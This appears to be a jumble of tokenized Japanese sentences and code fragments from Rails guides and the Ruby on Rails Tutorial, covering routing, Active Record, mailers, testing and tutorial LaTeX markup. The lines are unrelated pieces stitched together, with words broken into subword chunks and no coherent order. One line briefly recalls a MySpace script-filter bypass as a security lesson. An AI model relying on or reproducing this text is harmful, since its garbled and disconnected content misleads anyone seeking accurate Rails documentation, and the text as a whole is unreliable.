▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol } { HTTP } は \ href { https :// en ▖ w ikipedia ▖ org / wiki / State less _ proto col }{\ emph { ス テ ート レ ス な プロトコル } } です ▟ 文字 通り 「 ス テ ート ▁( state )」 が 「 ない ▁( less )」 ので 、 HTTP の リクエスト ひとつ ひとつ は 、 それ より 前の リクエスト の 情報を まったく 利用 できない 、 独立した ト ラン ザ ク ション として 扱 われます ▟ HTTP は 言 って み れば 、 リクエストが 終 わ ると 何も か も 忘れ て 次 回 最初から や り 直 す 健 忘 症 的な プロトコル であり 、 過 去 を 捨 て た 旅 から 旅 の 流れ 者 的な プロトコル です ▁( しかし 、 だ から こ そこ の プロトコル は非常に 頑 丈 なのです ) 。
▁Ruby の 定数 表 記 法 ▁( ` controller : ▁' Admin :: User Permission s ' ` など ) ▁ を コントローラ に対して 使用する と 、 ルーティング で 問題が生じ 、 警 告 が 出力 される 可能性があります 。
▁' X - Frame - Options ' ▁=> ▁' S A M E O R I G IN ',
▁\ k ode { rails ▁server } を実行し たとき のデフォルトの Rails ページ 。
▁ 以下のような 代入 文 を 三項演算子 で 置き換え ることもできます 。
▁* ▁ メイラー に ` receive ` メソッド を実装する
▁ ハ マ り やすい 手順 については できる だけ 情報を 補 う ようにしています が 、 すべての 場合 をカバー するのは 不 可能です 。
▁* ▁` lock `
▁ ア リ ス は 誤 って ▁“ S ub m it ” ▁ を 素 早く \ emph { 2 回 } クリック してしまいます ▟ そのため リクエストが 2 つ 連続 で 送信されます 。
▁layout ▁" in ve n to ry "
▁* ▁` append _ asset _ paths `: ▁ アプリケーション と 、 それ に 追加 されている railties に含まれている アセット パス を 探 索 し 、` config ▖ static _ asset _ paths ` で指定されている ディレクトリ を 監 視 します 。
▁\ k ode { create } と同じように 、\ k ode { destroy } は そのオブジェクト 自身 を返します が 、 その 返 り 値 を使用して も 、 もう一度 \ k ode { destroy } を呼ぶ ことはできません 。
▁ サインイン 関連の 作業 の 大 半 は 、 この cookies を ベース に して 認証システムを 構 築 する ことになります 。
▁Active ▁Record の 検索 メソッド には ` joins ` があり 、 生成された SQL で ` JOIN ` 句 を使用できます ▟ ` joins ` メソッド には さまざまな 使用 方法があります 。
▁def ▁are l _ table ▁# : no doc :
▁* ▁` has _ and _ belongs _ to _ many `
▁@ @ session _ store ▁= ▁store ▖ is _ a ?(
▁Rails では 「 設定 より 規 約 ▁( Co C : ▁convention ▁over ▁configuration )」 という ポ リ シ ー が 推 奨 されている ことを ご 存 じ か と思います 。
▁config ▖ assets ▖ en able d ▁= ▁true
▁ ユーザーを \ emph { リソース } とみなす 場合 、 id = \ k ode {1} のユーザー を参照 する ということは 、 / users /1 という URL に対して \ text tt { GET } リクエストを 発行する という ことを意味します 。
▁=> ▁" Michael ▁Hartl ▁< mhartl @ example ▖ com > "
▁このオプション は 、 ユーザー 入力 の ロケール が 不 正 である場合 の セキュリティ 対策 である ため 、 特別な 理由 が ない限り 無効 に しないでください 。
▁ RailsCasts では テスト を省略 している こと が多い ので 、 その 点 には 注意してください ▟ 1 回 の エ ピ ソ ー ド を 短 く まとめ るために テスト を省略 している のですが 、 それ に 釣 ら れ て テスティング の 重要 性 を 軽 く 考え ることのないように してください 。
▁class ▁Blorgh :: Article ▁< ▁ActiveRecord :: Base
▁この ヘッダ が正しく キャッシュ されている かどうかを確認 する ひとつ の 方法 として 、[ curl ]( ▁ http :// explain s hell ▖ com / explain ? cm d = curl + - I + http % 3 A % 2 F % 2 F www ▖ example ▖ com ) を使用する という 方法があります 。
▁$ ▁rails ▁generate ▁model ▁ Foo ▁bar : string ▁ baz : integer
▁ 中 身 のある ディレクトリ の 削除
▁このメソッド には `: remote ` オプション があり 、 以下のように 使用できます 。
▁Use ▁` bundle ▁show ▁[ gem name ]` ▁to ▁see ▁where ▁a ▁bundle d ▁gem ▁is ▁installed ▖
▁\ subsection { Back t ra ce サ イ レ ン サ ー } ▁% ▁( fold )╼ %
▁#### ▁ sanitize
▁(\ emph { 注 } : ▁ 今 皆 様 が 読んで い る この チュートリアル は 、 Rails ▁4▖0 という \ emph { バージョン } に 対応 しています ▟ 本書 は Rails ▁3▖2 から R a i l ▁4▖0 への バージョン アップ に とも な って 改 定 されました が 、 チュートリアル として の \ emph { 版 ( エ デ ィ ション )} は 更新 されていない ことに注意してください ▟ Rails ▁4▖0 に対応する ために 行った 変更 の 量 が わずか で 、 本書 の 版 を 改 め る には 及 ば ない と 判 断 した ためです 。
▁ 実は 、 この specify は \ k ode { it } と 同 義 であり 、\ k ode { it } を使用すると 英語 として 不 自然な 場合に これで 代 用 することができます 。
▁' X - Frame - Options ' ▁=> ▁' D E N Y '
▁` transform _ keys ` メソッドは 、 ブロック を 1 つ 取り 、 ハッシュ を 1 つ 返します ▟ 返される ハッシュ には 、 レシーバの それぞれの キー に対して ブロック 操作を 適用 した結果 が含まれます 。
▁concern ▁: comment able ▁do
▁ 完全な HTML 構造 を備えた Home ページのビュー
▁` app / assets / javascripts / blorgh / articles ▖ js ` と
▁ 現在 形で 書くこと ▟ " Re t ur n ed ▁a ▁hash ▁that ▖▖▖" ▁ や ▁" W i ll ▁return ▁a ▁hash ▁that ▖▖▖" ▁ ではなく " Re t ur n s ▁a ▁hash ▁that ▖▖▖" のように 書く 。
▁詳細については [ Rails アプリケーション を設定する ]( configuring ▖ html ) ▁ を参照してください 。
▁最初の コマンドは 、 現在の メ イン ▁(\ emph { master }) ▁ ブランチ 用の ▁" origin " ▁ として GitHub に追加します ▟ 次の コマンドで 実際に ▁GitHub に プッシュ します
▁この バリデーション ヘルパーは 仮 想 の 属性 を作成します ▟ その 属性 の名前 は 、 確認し たい 属性 名 に ▁" _ confirmation " ▁ を追加した もの になります 。
▁" :: In f le c tion s "▖ demodulize ▁# ▁=> ▁" In f le c tion s "
▁この 方 式 を使用する場合 、 リソース フル ルーティング のような 自動 的な ルーティング グループ の 生成 は 行われ ません 。
▁* ▁` action _ dispatch ▖ configure `: ▁` ActionDispatch :: Http :: URL ▖ t ld _ length ` を 構成 して 、` config ▖ action _ dispatch ▖ t ld _ length ` の値 ( トップレベル ドメイン 名 の長さ ) が設定され る ようにします 。
▁ 渡された ユーザーを \ k ode { remember } メソッドで 記 憶 する
▁ 一般的な シナリオ の 1 つ は 、 生成 した コードを 元に戻 したい場合 です ▟ たとえば 、 コントローラを生成 した 後で 、 もっと い い コントローラ 名を 思い 付き 、 生成 した コードを 削除 した く な った 場合 など です 。
▁ 完全な テスト 機能 を備えた 強力な Web フレームワーク が なかった 頃 は 、 テスティング 作業 は 苦 痛 に 満 ち 、 し ば し ば そこで エラーが発生し ました 。
▁リスト \ ref { code : email _ downcase } のコードは 、\ k ode { before _ save } コールバック に ブロック を渡して ユーザーの メールアドレス を設定します ▟ 設定 される メールアドレス は 、 現在の 値を String クラスの \ k ode { downcase } メソッドを使って 小文字 バージョン にした ものです 。
▁#### # ▁` collection ▖ build ( attributes ▁= ▁ { }, ▁ ▖▖▖)
▁resources ▁: video s
▁` rails ▁server ` コマンドは ` Rack :: Server ` の オブジェクト を作成し 、 ウェブ サーバーを起動 します 。
▁( 改良 すべき 点 として 、 有効化 されていない ユーザー が表示され ないようにする 必要 も ある のですが 、 これは \ ref { sec : activation _ resets _ exercises } の 課題 に 回 す ことにします ) 。
▁ 個 別の 属性 に関連する エラーメッセージ を追加する 代りに 、 オブジェクト の状態 全体 に関連する エラーメッセージ を追加する こともできます 。
▁beginning
▁次の {0}{1} 第 4 章 {/1}{/0} では 少し 回 り 道 を し 、 Rails を 支 え ている Ruby という 言語 について 簡単に 学びます 。
▁ サンプルアプリケーション で フィード を使う ために 、 カレント ユーザーの ページ 分割 された フィード に \ k ode {@ feed \_ items } インスタンス変数 を追加し ▁( リスト \ ref { code : feed _ instance _ variable }) 、 次に フィード 用の パーシャル ▁( リスト \ ref { code : feed _ partial }) ▁ を Home ページ に追加します ▟ Home ページに 変更 を加え た 結果は リスト \ ref { code : home _ with _ feed } で 示 します 。
▁ 通常 、 Rails ヘルパー を使用している場合 、 実装 の詳細 について 知 っ ておく 必要はありません ▟ ただし \ emph { f } という オブジェクトが \ k ode { 何 を する のか } は 知 っ ておく 必要があります ▟ ▁\ href { http :// www ▖ w 3 school s ▖ com / html / html _ form s ▖ as p } { HTML フォーム 要素 } ▁( テキストフィールド 、 ラ ジ オ ボタン 、 パスワード フィールド など ) ▁ に対応する メソッドが 呼び出される と 、\ emph {@ user } ▁ オブジェクトの 属性 を設定する ように 特 別 に 設計 された 要素 のための コード を返します 。
▁ 拡張子 が指定されてい ない場合は 、` ▖ css ` が自動的に 補 われます 。
▁"#{ module _ name } Helper "
▁なお 、\ k ode { => ▁nil } ▁という 結果は 、 簡 素 化 のために 今後 省略 する ことがあります 。
▁# ▁The ▁following ▁optional ▁lines ▁are ▁part ▁of ▁the ▁advanced ▁setup ▖
▁ パスワード再設定の テンプレート ▁( テキスト メール )
▁email インデックス を追加する と 、 データ モデリング の 変更 が必要 になります ▟ Rails では ▁(\ ref { sec : database _ migrations } で 見た ように ) ▁ マイグレーション で インデックス を追加します 。
▁` Time ` の拡張
▁ アダプタ が設定され ていない 場合 、 ジョブ は 直 ち に 実行されます 。
▁以下の 結果を 得 ます 。
▁また 、 scaffold を使用して 生成 を行なう と 、 その モデルの エラーメッセージ をすべて 表示する ERB が Rails によって 一部の ` _ form ▖ html ▖ erb ` ファイル に追加されます 。
▁#### ▁ XML を出力する
▁# ▁config / application ▖ rb
▁このメソッド を実行して も オブジェクトは destroy されません 。
▁ フレンドリーフォワーディング の実装
▁if ▁some _ com p le x _ condition _ in v ol v ing _ i var s _ and _ private _ methods ?
▁< html >
▁NOTE : ▁ アセットパイプライン の : cache オプション と : concat オプションは 廃 止 されました ▟ これらの オプションは ` javascript _ include _ tag ` と ` stylesheet _ link _ tag ` から 削除 してください 。
▁まずは \ k ode { setup } の ステップ で 、 fixture の サンプルユーザー と 紐 付け た 新しいマイクロポスト を作成し ています ▟ 次に 、 作成した マイクロポスト が 有効 かどうかを チェック して ます 。
▁ モデル の状態 を 確認し 、 無効な 場合に ` errors ` コレクション に メッセージ を追加する メソッド を作成する ことができます 。
▁この 呼び出し を避けるために 、「 従 属 している 方のモデル ( ` belongs _ to ` を 宣言 している 方のモデル )」 に カ ウ ン タ キャッシュ を追加する ことができます 。
▁class ▁Create Customer s ▁< ▁ActiveRecord :: Migration
▁ マイクロポストの データモデル は ユーザー よりも さらに シ ン プ ル です ▟\ k ode { id } と マイクロポストの テキスト 内容 を 格 納 する \ k ode { string } 型の \ k ode { content } だけで 構成 されています
▁このオプション が 効 く のは ` config ▖ cache _ classes ` が true の場合 のみ です ( ` config ▖ cache _ classes ` は production モードでは デフォルトで true です ) 。
▁ これはリスト \ ref { code : rails _ command } で使用されていました 。
▁<%= ▁form _ for ▁: article ▁do ▁| f | ▁%>
▁* ▁` render ` を呼び出し 、 ブラウザに 返す 完全な レスポンス を作成する
▁` collection ▖ size ` メソッドは 、 コレクション に含まれる オブジェクトの 数 を返します 。
▁ 単純な 場合 であれば 、 モデル名 に ` tableize ` を使用すると モデルの テーブル名 を 得られます 。
▁ アプリケーションを 本番環境で 実行する 場合 、 本番 の データベース が 利用 できない と アプリケーションを 実行 できません ▟ そのため 、\ text tt { rake ▁db : migrate } を 本番環境で 実行 して 本番 データベース を作成します 。
▁デフォルトのエラーメッセージは 、 実行される バリデーション の種類 によって 異なります 。
▁ 最後の 2 つの ステップ では 、 テスト 用の データベースに 3 1 人 以上の ユーザーが い る必要があります 。
▁この節では 、 以後 この モデル 用 ファイル を理解する ことに 専 念 します 。
▁ テスト ヘルパー に ` ActiveRecord :: Migration ▖ check _ pending !` の 呼び出し がある場合 、 これを 削除 することができます 。
▁ コントローラのアクション を追加した り 、 ルート ルーティング を変更 したり するだけで 「 hello , ▁world 」 アプリケーション を作成 できる 。
▁これで ユーザー一覧ページ が 動く ようになった ので 、\ ref { sec : pagination } の ページネーション に対する 簡単な テスト も 書 いて お き ましょう 。
▁Rails はこの リクエストを ` photos ` コントローラ内の ` destroy ` アクションに 割り当て 、` params ` ハッシュ に ` { ▁id : ▁' 17 ' ▁}` を含め ます 。
▁Relationship s コントローラ が Ajax リクエスト に応答する こと をテストする 。
▁この 方法は ポ リ モ ー フ ィ ッ ク リレーションシップ で も同様に 使用できます 。
▁上の 文 は以下のように 書く こともできます 。
▁has _ many ▁: comments
▁ 削除リンク を追加した ユーザー 一覧 のモックアップ
▁ここでは 、 以下のように rake コマンドで マイグレーション を実行します 。
▁| ▁| ▁4 12 ▁| ▁: pre condition _ failed ▁|
▁render ▁" products / show "
▁このメソッド では Action ▁Mailer ライブラリ を使用して User の \ emph { メイラー } を追加します ▟ この メイラー は Users コントローラの \ k ode { create } アクション で 有効化 リンクを メール送信 するために 使用します 。
▁<%= ▁f ▖ label ▁: body , ▁' Bo d y ' ▁%> :
▁\ ref { sec : users _ controller } のコード により 、 新規ユーザー 用の 動作する ページ が / users / new ▁ に で きました ▟ ここで 表 \ ref { table : url _ m app ing } を 思い 出 して い ただ き たい のですが 、 URL は / users / new ではなく 表 のとおり に / signup に したい と思います 。
▁### ▁ カスタム メソッド
▁従って 、 こうした コード をすべて 自分で 作成する 必要 はほとんど ありません 。
▁もちろん 、 実際の Web サイト では サンプルデータを 生成 し たくない という 人 も い る か と思います が 、 これ には 理由 があります ▁( 図 \ ref { fig : heroku _ sample _ users }) 。
▁{0} 図 11 ▖ 6 {/0} ▁{1} ユーザー プロフィール と スタイル の ない マイクロポスト {/1}
▁Rails ▁4▖1 より 前に 作成された アプリケーションでは 、` Marshal ` を使用して cookie 値を 署 名 済み または 暗号化 した cookies ▁ j ar に シリアライズ していました 。
▁i ▁= ▁It em ▖ lock ▖ first
▁この 設定 を定義する には 、 エンジン で使用する ` Blorgh ` モジュール 内部 に ` m attr _ accessor ` という ア ク セ ッ サ を 置く 必要があります 。
▁# ▁=> ▁< option > V IS A </ option > ▁< option > M as ter C ar d </ option >
▁ 身 近 に Rails 使い が いる場合 は 、 送信 前に コードを 詳 しく チェック しても ら い ましょう 。
▁ユーザー を作成する ▁( ユーザー登録 ) ▁ 場合 と同様 、 セッション を作成する 場合 ▁( サインイン ) ▁ で 最初に や ること は 、\ emph { 正しく ない } 入力 の 取り 扱 い です 。
▁ 話 を簡単に する ため 、 記事 の フォームの テキストフィールド は ` author _ name ` と する ことにします ▟ 記事 を書く ユーザーが ここに 自分の 名前 を 入 れ られる ようにします 。
▁( Git を導入し た のは 、 まさに この Heroku で 使う ため で もあります ▟ まだ Git をインストール していない 方は \ ref { sec : version _ control } を参照してください ) 。
▁ { a : ▁1 } ▖ with _ indifferent _ access [" a "] ▁# ▁=> ▁1
▁ これはリスト \ ref { code : account _ activation _ and _ password _ resets } で使用されていました 。
▁ リレーション に対して も 直接 実行されます 。
▁config ▖ assets ▖ compile ▁= ▁false
▁たとえば 、\ ref { sec : rails _ server } では 以下の \ k ode { rails ▁server } コマンドで ローカル development ▁Web サーバー を実行し ています 。
▁* ▁以下の アプリケーション 設定 を変更 しておくこと 。
▁ strip _ links (' Blog : ▁< a ▁ href =" http :// my blog ▖ com / "> Visit </ a > ▖ ')
▁a aaaaaaaaaa aaaaaaaaaa aaaaaaaaaa aaaaaaaaaa "
▁このとき 、 ▁リスト { p 0} の {2} destroy {/2} メソッドでは リダイレクト を 使 っ ている点に注目してください 。
▁ そして \ emph { Ruby ▁on ▁Rails チュートリアル } では 、 複 雑 さ を避けるために \ href { http :// c 9 ▖ io /}{ Cloud 9 } という 素晴らしい クラウド IDE サービス を使って 進 め ていきます 。
▁ デフォルトで 作成される RESTful な ルーティング は 7 つ ですが 、 7 つ で なければならない という ことはありません 。
▁ バ ッ ク ト レ ー ス 出力 を 絞 り 込 んで 不要な 行 が表示され ない ように したい場合は 、\ ref { sec : backtrace _ silencer } を ご 覧 ください 。
▁ マイクロポスト 用の コードの ある ユーザー プロフィール ページ ▁( ただし マイクロポスト がない )
▁ こう い う 場合は \ k ode { update } アクションに する のではないかと お 思い の方 も い る でしょう ▟ しかし 、 有効化 リンク は メール で ユーザーに 送 られる ことを思い出してください ▟ この リンクを クリック すれば 、 ブラウザで 普通 に クリック した の と同じ こと になり 、 ブラウザから 発 行 される のは ▁(\ k ode { update } アクション で使用する \ text tt { PATCH } リクエスト ではなく ) ▁ 必 然 的に \ text tt { GET } リクエスト になります ▟ GET リクエスト を受け る には edit アクションに なら ざ る を 得 ない わけで す 。
▁Relationship s コントローラで Ajax に 対応 させるため に 、\ k ode { respond \_ to } メソッドを \ k ode { create } アクションと \ k ode { destroy } アクション ▁( リスト \ ref { code : relationships _ controller _ following }) ▁ に それぞれ 追加 してみましょう 。
▁ 依 存 している オブジェクトを 作成 / 削除 するとき は 、 常に 関連付けを 通 す ように することで 、 より セキュア な 操作 が 実現 できる
▁ 経験 上 、 上 で説明した ような 連結 ▁( concat en ation ) ▁ 操作を 除 き 、 どんな メソッド でも 潜 在 的に は 文字列を 安全 でない もの に変換 してしまう 可能性 がある ことに 常に 注意 を 払 う 必要があります 。
▁ 有効 でない ユーザーがログイン すること の ないようにする
▁\ k ode { name } の長さ の検証 に対するテスト
▁c 1 ▖ first _ name ▁= ▁" Michael "
▁scaffold を使用して リソース を生成する ときに 、 Rails が デフォルトで どんな こと を行なう のか 見 てみましょう 。
▁次の 問題 は 、 MySpace は " javascript " という 単語 を フィルタ していました が 、「 ja v a & lt ; N E W L IN E & gt ; script 」 と 書くこと で この フィルタ を 回 避 でき てしまった ことで した 。
▁Rails ▁4▖1 では 、 Rails 自身 の エ ン コ ー ダ を JSON ▁gem から 切り 離 す ことで これらの 問題 が 修正 されました 。
▁ モデルの ID が 破 損 する 、 ID の 競 合 で 例外 が発生する など 、` has _ and _ belongs _ to _ many ` 関連付け の動作 が 怪 しい 場合は 、 この 設定 を 忘れ ていない かどうか 再度 確認し てみてください 。
▁ リレーションシップ という パ ズ ル の 最後の 一 片 は 、\ k ode { user ▖ followers } メソッド を追加する ことです ▟ これは 上の \ k ode { user ▖ following } メソッドと 対 になります 。
▁< td > <%= ▁a ▁%></ td >
▁\ k ode { about } アクション が追加された StaticPages コントローラ 。
▁ 短い 要 約 文 ▁( 50 ▁ 文字 以下 だと 理想 的 )
▁#### ▁` assert _ routing ` アサーション
▁# ▁-- seed ▁ 123 4
▁ これまで に 名前付き ルーティング を だ い ぶ 追加 し てきた ので 、 ここで アプリケーションの 全 ルーティング を 表示 できる と 便利です ▟\ k ode { rake ▁routes } コマンドを実行 すれば い つ でも ルーティング の リスト を 表示 できます 。
▁# ▁ここでは メール のインスタンス や
▁ エンジン を 1 つだけ マイグレーション したい場合 、 以下のように ` S C O P E ` を指定します 。
▁しかし 、 今回の ように ▁“ 1 ▁microposts ” ▁ と 表示 してしまう と 英語 の 文法 上 誤り になってしまいます ▟ そこで 、\ ref { sec : signup _ error _ messages } で紹介した \ k ode { pluralize } メソッドを使って ▁“ 1 ▁micropost ” ▁ や ▁“ 2 ▁microposts ” ▁ と 表示する ように 調 整 しています 。
▁これは 、 ユーザーを 30 人 も 作成する と システムによっては 速 度 が 低 下 すること があり 、 それ を防ぐ ためのものです 。
▁ これはリスト \ ref { code : sessions _ helper _ include } で使用されていました 。
▁ 他の 認 証 用 機能 と同様に 、\ k ode { sign _ out } も Sessions ヘルパー モジュール の中に 置きます 。
▁これは ` via : ▁: all ` の 適切な 利用 法 です ▟ という のは 、 適切 と 考え られる すべての HTTP 動詞 を Rack アプリケーションで 扱えるように できる からです 。
▁Heroku の コマンドライン インターフェイス ▁( C L I ) ▁ が インストール されている ことが 確 認 でき たら 、 いよいよ \ k ode { heroku } コマンドで ログイン して SSH キー を追加します 。
▁この エラー は 、 明示的に 定義された 名前付きルート や ` resources ` メソッド によって トリガ されます 。
▁[ Active ▁Record は M ar t in ▁F o w ler によって ]( http :// www ▖ m ar t info w ler ▖ com / ea a C at a log / active Record ▖ html ) ▁ _ Pattern s ▁of ▁E nterprise ▁Application ▁ Architectur e _ ▁という 書 籍 で 記 述 されました 。
▁ あ ら か じ め RailsCast 「\ href { http :// r ailscasts ▖ com / episodes / 37 - simple - search - form } { 簡単な 検索 フォーム } ▁( 英語 )」 を参照 して おくとよいでしょう 。
▁ それらの HTML 要素 に Ajax コードを 若 干 追加 した く な った ときに も 、 Rails が ちゃんと サポート してくれます 。
▁ 本書 では 以後 、 この アプリ の 良い 点を 保 ち つ つ 、 弱 点を ひとつ ひとつ 克服 していきます 。
▁その ぐらい ▁\ href { http :// r ailscasts ▖ com /}{ \ emph { RailsCasts } } ▁ は お勧め です 。
▁` Hash ` の拡張
▁ 修正 された Help ページ
▁</ form >
▁最後に 、 {0}{1} 第 10 章 {/1}{/0} で メールアドレス を使って アカウントを有効化する 方法 と 、 パスワードを リ セット する方法 について 学びます 。
▁ 検索 メソッドで 実行される SQL に ` G R O U P ▁BY ` 句 を追加 したい場合は 、` group ` メソッドを 検索 メソッドに 追加 できます 。
▁render ▁" edit "
▁さらに 、 複数の レコードを 一度 に 更新 したい のであれば 、` update _ all ` という クラスメソッド が 便利です 。
▁ コードが 重複 しないよう 、\ k ode { signed _ in _ user } を Users コントローラ から も 削除 しておきましょう 。
▁このとき は 、 本書 が提供する テストコード と 、 テストスイート が パス する まで エラーメッセージ の 修正 を 繰り返す という 方法 だけ を 頼 り に 作業を 進 め ました 。
▁リスト \ ref { code : logged _ in _ p } を追加した ので 、 ユーザーの ログイン 時に レイアウト を 変 えられ るように する 準備ができました 。
▁リスト \ ref { code : password _ migration } では 、\ k ode { add _ column } メソッドを使って \ k ode { users } テーブル \ k ode { password _ digest } カラム を追加 しています 。
▁╼╼ ▁\ subsection { ハッシュ化 された パスワード } ▁% ▁( fold )╼ ▁\ label { sec : a _ hashed _ password }╼╼
▁なお 、 Windows の コマンド プロンプト では 、 ディレクトリ の 区切り は 次のように バ ッ ク スラッシュ または 円 マーク で 表示されます 。
▁c ▖ first _ name ▁== ▁ o ▖ customer ▖ first _ name ▁# ▁=> ▁false
▁email 属性を 小文字 に変換 して メールアドレス の 一意性 を 保 証 する ▁( {2}{3}{/3}{3}{4} G R EEN {/4}{/3}{3}{/3} ) {/2}
▁ クラスの \ k ode { new } メソッドを 呼び出し た 結果は 、 その クラスの オブジェクト であり 、 これは クラスの \ emph { インスタンス } とも 呼 ば れ ます 。
▁### ▁` validates _ with `
▁date :
▁after _ action ▁: set _ delivery _ options ,
▁これは 、 プログラマ にとって は 便利な 方法 ですが 、 本番環境 にとって は 非 効率 です 。
▁リスト \ ref { code : sendgrid _ config } に示した とおり 、 本番 Web サイトの アドレス を \ k ode { host } 変数 に 定義 する 必要もあります 。
▁ レイアウト に shim と header の パーシャル を追加する
▁It em ▁ Update ▁( 0 ▖ 4 m s ) ▁ UPDATE ▁` items ` ▁ SE T ▁` updated _ at ` ▁= ▁' 200 9 - 02 - 07 ▁ 18 : 05 : 5 6 ', ▁` name ` ▁= ▁' J one s ' ▁WHERE ▁` id ` ▁= ▁1
▁詳細については \ href { http :// git - s cm ▖ com / book / en / git - branch ing }{\ emph { Pro ▁Git } の Git ブランチ } に関する 章 を参照 。
▁ s ▁= ▁" "▖ html _ safe
▁ 内部 の ` Mail :: Message ` オブジェクトの 表示 や 変更 など を 行いたい 場合は 、` ActionMailer :: Message Delivery ` オブジェクトの ` message ` メソッド にアクセス します 。
▁ 通常 、 Web サイト は 80 番 ポート で 受 信 待 ち します が 、 この ポート を使用する には 特別な 権限 が必要になる こと が多い ので 、 一般的な 慣習 として 、 制限 が あまり ない 大 き め の ポート 番号 ▁( いわゆる ハ イ ナ ン バー ポート ) ▁ を使用します 。
▁ SELECT ▁" articles "▖
▁# ▁=> ▁S at , ▁01 ▁A ug ▁2010 ▁00:00:00 ▁UTC ▁+00:00 ▖ ▖
▁Ruby と Rails の お勧め 書 籍 ▟ 「\ href { http :// www ▖ a mazon ▖ com / gp / product / 14 3022 36 34 }{\ emph { B eginning ▁Ruby }}」( P eter ▁Cooper ▁ 著 ) 、 「\ href { http :// www ▖ a mazon ▖ com / gp / product / 19 3 3 9 88 6 57 }{\ emph { The ▁We ll - G rounded ▁Ruby ist }}」( David ▁A ▖ ▁B la c k 著 ) 、 「\ href { http :// www ▖ a mazon ▖ com / Eloquent - Ruby - Addi s on - We s le y - P rofessional - Seri es / d p /0321 58 4 10 4/ }{\ emph { Eloquent ▁Ruby }}」( Russ ▁O l s en 著 ) 、 Ruby を さらに 深 く 学ぶ のであれば ▁ 「\ href { http :// www ▖ a mazon ▖ com / gp / product / 06 723 2 88 44 }{\ emph { The ▁Ruby ▁Way }}」( H al ▁F ul to n 著 ) ▁ がお勧めです ▟ Rails を さらに 深 く 学ぶ のであれば 、 「\ href { http :// www ▖ a mazon ▖ com / gp / product /0321 60 16 6 1 }{\ emph { The ▁Rails ▁3 ▁Way }}」( O b i e ▁F er n and e z 著 ) と 「\ emph { Rails ▁3 ▁in ▁Action } ▁( 第 2 版 待 ち ) 」( Ryan ▁B ig g 、 Y e h u d a ▁ K at z 著 ) ▁ がお勧めです 。
▁ 拡張 した マイクロポストの データモデル を 、 図 \ ref { fig : micropost _ model _ picture } に示します 。
▁def ▁ calculate _ ship p ing _ cha r ge s ( order )
▁Rails における デフォルトの 複数形 の慣習 に 従 えば 、 ある ユーザーを フォローしている すべての ユーザーの 集合 は \ emph { followers } となり 、\ k ode { user ▖ followers } は それらの ユーザーの 配列 を表す ことになります 。
▁Rails で 使える 短縮 形 の例
▁そこで 、` Comments Controller ` を使用して コメント を作成 したり 、 スパム コメント が 書き 込 まれ たら 削除 できるように したい と思います 。
▁{0} 図 2▖1 0 {/0} ▁{1} ユーザーを削除する {/1}
▁ オブジェクト の存在 チェック
▁ コンソール を 起動 して 、 User モデルに 検証 を追加した 効果 を見てみましょう
▁なお 、 ここで 使用する テスト や 検証 は 、 形式 が ひ と まず 有効なメールアドレス を受け 入 れ 、 形式 が あ から さ ま に 無効な もの を 拒 否 するだけで あり 、 すべての 場合 を 網羅 した もの ではない という 点に注意 してください 。
▁S ublime ▁Text 、 TextMate 、 g V im 、 M ac V im などの GUI エディタ を使用する場合 、 シェル から 離 れ ず シェル 内で 起動 するよう フラグ を付け てください
▁なお 、 リスト { p 0} には す で に {2} belongs _ to {/2} という コード があります が 、 これはリスト \ ref { code : micropost _ migration } の マイグレーション によって自動的に 生成された コード です 。
▁ これはリスト \ ref { code : basic _ signup _ tests } で使用されていました 。
▁つまり 、 ここでは \ k ode { following \_ id s } メソッド をそのまま 使 えば よい だけ なのです 。
▁この オブジェクトは 、 渡された 属性 で インスタンス化され 、 そのオブジェクト の 外部キー を 介 して リンク が設定され ます ▟ ただし 、 関連付けられたオブジェクト はまだ 保存 されません 。
▁ そのような キー が 見 つ か った 場合 、` ArgumentError ` が発生し ます 。
▁use ▁ ActionDispatch :: Re load er
▁ sunday
▁第 \ ref { cha : log _ in _ log _ out }, 章では 、 この \ k ode { authenticate } メソッドを使って ログイン する方法 を 解説します 。
▁上の 例 で言う と 、 " contributors " です 。
▁# ▁check ▁< tt > collection ▖ length ▖ zero ? </ tt > ▖ ▁( < tt > collection ▖ length ▖ zero ? </ tt > をチェックする こと )
▁( これらの ルール は Home ページ で すべて 適用 される とは限りません が 、 サンプルアプリケーションの 他の 場所 でも 使用される もの もあります ) 。
▁# ▁=> ▁{" A " =>1 }
▁ といった 部分 が 、 次のように ▁( 少し ) ▁ 分 か り やすい コード になります 。
▁ ビューの メ イン 部分 は 常に 「 名前 の ない 」 ` yield ` として レンダリング されます 。
▁ こ の中で もっと も 重要なのは もちろん コントローラ です ▟ welcome コントローラは ` app / controllers / welcome _ controller ▖ rb ` に 作成 され 、 対応する index ビュー が ` app / views / welcome / index ▖ html ▖ erb ` に 作成されます 。
▁### ▁` has _ one ▁: through ` 関連付け
▁上のコードでは 、 以下のように \ k ode { User ▖ new } ハッシュの 初期化 に \ k ode { : password } と \ k ode { : password _ confirmation } を追加し ていることに注目してください 。
▁\ href { http :// mb sy ▖ co / 6 V Q 8 l } { Code ▁School } : ▁ プログラミング を対話的に 学習 できる コース
▁ 加えて 、 既 成 品 の システム は 内部 が わ か り づ ら い ことが 多く 、 ブ ラ ッ ク ボックス になっています ▟ 自分で 作成した システム であれば 、 それを と ても よく 理解 している はずです 。
▁たとえば User モデル を調べ たい とき など には 便利です が 、 今 の ところ は ▁\ k ode { params } の 中 身 を 精 査 する などの 込 み 入 った ことはできません ▟)
▁しかし ご 心 配 なく ▟ 面倒な 部分 は既に Rails が 全 部 面倒 を見 て く れ ています ▟\ k ode { rails ▁generate ▁controller } ▁( リスト \ ref { code : generating _ pages }) ▁ を実行し た時点で テスト ファイルが ちゃんと 作成 されているので 、 それを 利用 しましょう 。
▁たとえば 、` - > ▁ { ▁ offset ( 11 ) ▁}` と 指定 すると 、 最初の 11 レコード は スキップ され 、 12 レコード 目 から 返される ようになります 。
▁# ▁ユーザーの ステータスフィード を返す
▁Rails の パーシャル は 効率 化 のために 使われ 、 別 ファイルに マークアップ を 切り 出 す ことができます
▁=> ▁nil
▁しかし これは 正常に 機能 しない でしょう 。
▁ 以下のような 書き 方は ' インライン JavaScript ' と呼ばれ ています 。
▁ 今回の モデルの 生成 には 、` Article ` モデル を生成し たとき と同じ ジェネレータ を使用します 。
▁ コメントアウト した 部分 は 、\ ref { sec : activation _ test _ and _ refactoring } で アカウント有効化 の テストをパスさせ る ときに 元に戻 します 。
